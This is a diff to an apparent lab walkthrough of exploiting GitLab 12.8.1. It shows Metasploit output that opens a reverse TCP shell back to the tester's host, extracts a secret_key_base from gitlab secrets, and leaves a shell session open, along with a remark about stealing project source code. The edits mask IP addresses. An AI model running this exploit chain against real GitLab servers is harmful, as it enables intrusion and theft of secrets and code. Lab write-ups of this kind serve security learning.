@@ -81,7 +81,7 @@ Payload options (generic/shell_reverse_tcp):
 Exploitation RCE vulnerability: 
 
 ```
-[*] Started reverse TCP handler on 10.10.14.137:2222 
+[*] Started reverse TCP handler on 10.10.14.**:2222 
 [*] Executing automatic check (disable AutoCheck to override)
 [+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
 [*] Logged in to user oleksii
@@ -89,14 +89,14 @@ Exploitation RCE vulnerability:
 [*] Created project /oleksii/Dq5g60ow
 [*] Created issue /oleksii/irUhEXC3/issues/1
 [*] Executing arbitrary file load
-[+] File saved as: '/root/.msf4/loot/20210102160557_default_10.10.10.216_gitlab.secrets_454778.txt'
+[+] File saved as: '/root/.msf4/loot/20210102160557_default_10.10.10.*_gitlab.secrets_454778.txt'
 [+] Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
 [*] NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file read
 [*] Attempting to delete project /oleksii/irUhEXC3
 [*] Deleted project /oleksii/irUhEXC3
 [*] Attempting to delete project /oleksii/Dq5g60ow
 [*] Deleted project /oleksii/Dq5g60ow
-[*] Command shell session 3 opened (10.10.14.137:2222 -> 10.10.10.216:50878) at 2021-01-02 16:06:02 -0500
+[*] Command shell session 3 opened (10.10.14.*:2222 -> 10.10.10.*:50878) at 2021-01-02 16:06:02 -0500
 
 ls -la
 total 8
@@ -182,7 +182,6 @@ Exit the console and try to login with your new password.
 
 Now can login as admin - dexter : secret_pass and can see all repos with credentials and keys. 
 
-So now see how can steal project Source code in 60 seconds because I think If you repeat all command from this notes then spend no more than 60 second.in 60 seconds bacouse I think If you repeat all command from this notes and spend no more than 60 second. 
-
+So now see how can steal project Source code in 60 seconds because I think If you repeat all command from this notes then spend no more than 60 second. 
 
  
